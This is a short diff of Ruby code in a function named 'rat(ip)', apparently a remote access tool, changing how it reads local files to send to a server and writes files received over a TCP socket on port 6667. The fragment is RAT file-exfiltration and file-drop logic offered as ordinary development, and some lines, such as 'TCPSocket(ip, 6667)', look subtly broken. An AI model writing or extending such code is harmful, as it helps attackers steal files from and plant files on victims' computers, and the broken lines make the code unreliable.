@@ -59,7 +59,7 @@ def rat(ip)
         if File.exist? file && format
           if format == 'binary'
             content = File.binread file
-          elsif format == 'text'
+          else
             content = File.read file
           end
           # send file to server
@@ -75,10 +75,8 @@ def rat(ip)
 
         if format == 'binary'
           file = File.open(file,'wb')
-        elsif format == 'text'
-          file = File.open(file,'w')
         else
-          socket.puts 'done'
+          file = File.open(file,'w')
         end
         sock = TCPSocket(ip, 6667)
         sock.each{ |line| file.write line }
